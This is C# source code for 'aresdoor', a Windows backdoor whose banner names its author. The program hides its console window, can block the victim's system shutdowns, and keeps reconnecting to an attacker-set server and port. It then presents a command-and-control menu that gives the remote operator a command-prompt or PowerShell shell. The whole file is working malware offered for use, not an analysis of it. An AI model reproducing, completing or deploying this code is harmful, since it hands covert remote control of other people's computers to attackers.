using System;

namespace aresdoor
{
    class Program
    {
        private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
        private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);

        // Modify these variables as needed.
        private static string server = "localhost";
        private static int port = 9000;
        private static bool prevent_shutdown = false;
        
        static void Main(string[] args)
        {
            /*
             * Usage:
             *      ./aresdoor.exe [server] [port]
             *      or
             *      ./aresdoor.exe (no args) << requires hardcoded configuration
             * 
             */

            #if !DEBUG
                /* Hide console if debug mode is disabled. */
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE); // hide window
            #endif

            /* Intercept command line arguments if any are found. */
            try
            {
                if (args.Length >= 2)
                { server = args[0]; port = Int32.Parse(args[1]); }
            } catch (Exception exc) { Console.WriteLine(exc.Message); }

            /* Undertermined code. Not sure if it's required or not? */
            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ToString()).Length != 0)
            { System.Environment.Exit(0); }

            /* Prevent the client (victim) from shutting down the computer */
            if (prevent_shutdown == true)
            {
                new System.Threading.Thread(() =>
                {
                    System.Threading.Thread.CurrentThread.IsBackground = true;
                    while (true)
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        process.StartInfo.FileName = "shutdown.exe";
                        process.StartInfo.Arguments = "-a";
                        process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        process.Start();
                        process.WaitForExit();
                        System.Threading.Thread.Sleep(2000);
                    }
                }).Start();
            }

            /* Persistant backdoor connection */
            persistantBackdoor:

            #if DEBUG
            while (true)
            {
                if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
                {
                    try
                    {
                        Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);

                        // Define a couple of variables that set our connection target
                        System.Net.Sockets.TcpClient tcpClient = new System.Net.Sockets.TcpClient(server, port);

                        // Custom class/method instances
                        NetworkCommunication nc = new NetworkCommunication();
                        BackdoorCollection bc = new BackdoorCollection();

                        // Write in loop for a persistant connection
                        while (true)
                        {
                            candcmenu:

                            string aresdoorStartMenu = string.Empty;
                            string responseFromServer = string.Empty;
                            
                            aresdoorStartMenu += "+-------------------------------------------------------------+\n";
                            aresdoorStartMenu += "| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |\n";
                            aresdoorStartMenu += "| Current Version: v1.3                                       |\n";
                            aresdoorStartMenu += "|                                                             |\n";
                            aresdoorStartMenu += "| C&C Menu Version: v1.0                                      |\n";
                            aresdoorStartMenu += "+-------------------------------------------------------------+\n";
                            aresdoorStartMenu += "\nPlease select an option below:\n";
                            aresdoorStartMenu += " 1) Command Prompt Backdoor\n";
                            aresdoorStartMenu += " 2) Powershell Backdoor\n";
                            aresdoorStartMenu += " 3) Exit\n\n";
                            
                            nc.DataTravelTO(tcpClient, "\n" + aresdoorStartMenu);

                            optionInputDisplay: // Define a mark for requesting an option to be inputted
                            nc.DataTravelTO(tcpClient, "aresdoor> ");
                            
                            // Wait for a response
                            responseFromServer = nc.DataTravelFROM(tcpClient);
                            responseFromServer = responseFromServer.Replace("\n", string.Empty).Replace(" ", string.Empty);

                            if (responseFromServer == "1")
                            {
                                while (bc.CommandPromptBackdoor(tcpClient)) { }
                                goto candcmenu;                                
                            }
                            else if (responseFromServer == "2")
                            {
                                while (bc.PowershellBackdoor(tcpClient)) { }
                                goto candcmenu;
                            }
                            else if (responseFromServer == "3" || responseFromServer == "exit")
                            {
                                nc.DataTravelTO(tcpClient, "Closing TCP Connection... You have 5 seconds before another shell is spawned.\n");

                                nc.CloseTCPStream(tcpClient);

                                System.Threading.Thread.Sleep(5000);
                                goto persistantBackdoor;
                            }
                            else if (responseFromServer == "")
                                goto optionInputDisplay;
                            else
                            {
                                nc.DataTravelTO(tcpClient, "Sorry, \"" + responseFromServer + "\" is not a recognized command.\n");
                                goto optionInputDisplay;
                            }
                        }

                        // sendBackdoor(server, port);
                    }
                    catch (Exception exc)
                    { Console.WriteLine(exc.Message); goto persistantBackdoor; } // pass silently unless debug mode is enabled
                }
                else
                { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }
            #else
            while (true)
            {
                if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
                {
                    try
                    {
                        sendBackdoor(server, port);
                    }
                    catch (Exception) { } // pass silently unless debug mode is enabled
                }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }
            #endif
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 1;
        const int SW_HIDE = 0;
    }
}
